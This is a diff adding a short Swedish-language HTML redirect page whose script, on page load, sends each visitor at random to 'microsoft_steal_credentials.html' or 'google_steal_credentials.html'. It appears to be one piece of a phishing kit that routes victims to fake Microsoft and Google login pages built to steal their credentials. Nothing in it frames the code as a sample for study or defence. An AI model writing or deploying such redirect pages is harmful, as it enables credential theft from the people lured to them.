@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="sv">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Omdirigering</title>
+    <script>
+        // Lista över möjliga sidor att ladda
+        const pages = [
+            'microsoft_steal_credentials.html',
+            'google_steal_credentials.html'
+        ];
+        
+        // Slumpmässigt välj en sida och omdirigera direkt
+        const randomPage = pages[Math.floor(Math.random() * pages.length)];
+        window.location.href = randomPage;
+    </script>
+</head>
+<body>
+</body>
+</html>
